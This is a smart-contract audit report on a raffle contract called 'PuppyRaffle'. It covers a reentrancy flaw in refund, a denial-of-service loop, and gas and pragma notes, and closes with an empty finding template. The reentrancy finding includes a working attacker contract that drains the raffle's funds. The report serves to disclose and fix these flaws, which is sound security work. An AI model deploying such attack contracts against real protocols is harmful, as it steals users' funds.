### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance


**Description:** The `PuppyRaffle::refund` function do not follow CIE (Checks, Effects, Interactions) and has a result, allows participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to `msg.sender` address and only after making the external call do we update the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public { 
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. This could continue the cycle until the contract fund is drained. 

**Impact:** All fees paid by raffle entrants could be stolen by malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund` function
3. Attacker enters the raffle.
4. Attacker calls `PuppyRaffle:refund` from their attack contract, draining the contract balance.

**Proof of Code**

<details>
<summary>code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascript
    function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackerUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance", startingAttackContractBalance);
        console.log("starting contract balance", startingContractBalance);

        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log("ending contract balance", address(puppyRaffle).balance);
    }
```

and this contract as well

```javascript
    contract ReentrancyAttacker {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee;
        uint256 attackerIndex;

        constructor(PuppyRaffle _puppyRaffle) {
            puppyRaffle = _puppyRaffle;
            entranceFee = puppyRaffle.entranceFee();
        }

        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffle.enterRaffle{value: entranceFee}(players);
            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(attackerIndex);
        }

        function _stealMoney() internal {
            if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex);
            }
        }

        receive() external payable {
            _stealMoney();
        }

        fallback() external payable {
            _stealMoney();
        }
    }
```
</details>

**Recommended Mitigation:** To prevent this , we should have the `PuppyRaffle:refund` function update the `players` array first before making the external call. Additionally, we should move the event emission up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```


### [M-#] Looping through the players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential Denial Of Service (DoS) attack, increasing gas cost for future entrants.

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more check a new player will have to make. This means the gas cost for players who enter the raffle right at the start of the raffle will be dramatically lower than those who enter later.Every additional address in the `players` array is an additional check the loop will have to make.

```javascript
// @audit DoS attack
@>    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas cost for raffle entrants will be greatly increased as more players enter the raffle. Discouraging latter users from entering, and cause a rush at the start of the raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter the raffle, the gas cost will be such:
- 1st 100 players: ~6503275 gas
- 2nd 100 players: ~18995515 gas

This is more than 3x more expensive for the second 100 players.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_denialOfService() public {
        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }

        // See how much gas it cost
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas cost of the first 100 player: ", gasUsedFirst);


        // Let's enter for the 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum);
        }

        // See how much gas it cost
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas cost of the second 100 player: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```
</details>

**Recommended Mitigation:** There are a few recommendations.
1. Consider allowing duplicates. Users can make new wallets addresses anyways, so a duplicate check does not prevent the same person from entering multiple time, only the same wallet address.
2. Consider using a mapping to check for duplicates. This will allow constant time lookup whether a user has already entered.

```solidity
+ mapping(address => uint256) public addressToRaffleId;
+ uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only for the new players
+       for (uint256 i = 0; i < newPlayers.length - 1; i++) {
+                require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+        }
-        for (uint256 i = 0; i < players.length - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    } 
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        .
        .
        .
    }
```  

Alternatively, you could use [openZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/5.x/api/utils#EnumerableSet).


# Gas

### [G-1] Unchanged variables should be declared constant or immutable

Reading from storage is much more expensive that reading from a constant or immutable.

Instances:
`PuppyRaffle::raffleDuration` should be `immutable`
`PuppyRaffle::commonImageUri` should be `constant`
`PuppyRaffle::rareImageUri` should be `constant`
`PuppyRaffle::legendaryImageUri` should be `constant`


### [G-2] Storage variable in a loop should be cached

Everytime you call `players.length you read from storage , as opposed to memory which is much gas efficient.

```diff
+       uint256 playerLength = players.length
-         for (uint256 i = 0; i < players.length - 1; i++) {
+         for (uint256 i = 0; i < playerLength - 1; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
+             for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

# Informational

### [I-1] Unspecific Solidity Pragma

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6; // # ? is this the right version?
	```

</details>


### [I-2] Incorrect versions of Solidity.
Configuration
Check: solc-version
Severity: Informational
Confidence: High

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**:
Deploy with a recent version of Solidity at least: 

`0.8.0` 
with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentations for more information.


### [I-3] Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 66](src/PuppyRaffle.sol#L66)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 211](src/PuppyRaffle.sol#L211)

	```solidity
	        feeAddress = newFeeAddress;
	```

</details>

### [S-#] TITLE

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 